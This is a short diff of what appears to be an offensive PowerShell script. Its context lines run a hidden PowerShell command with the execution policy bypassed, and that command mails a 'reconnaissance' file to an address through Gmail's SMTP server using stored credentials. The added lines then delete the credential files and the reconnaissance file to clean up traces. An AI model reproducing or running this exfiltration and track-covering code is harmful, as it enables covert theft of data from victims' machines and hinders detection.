@@ -44,6 +44,10 @@ Add-Content -Path $config_file -Value $temp_dir
 # Send Initial reconnaissance
 powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $email -to $email -subject $config_file -attachments $config_file -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $email ,(convertto-securestring -string '$password' -asplaintext -force))}"
 
+# cleanup your credentials and reconnaissance files
+Remove-Item .\email.txt -Force
+Remove-Item .\password.txt -Force
+Remove-Item .\$config_file -Force
 
 
 # goto temp and make working directory
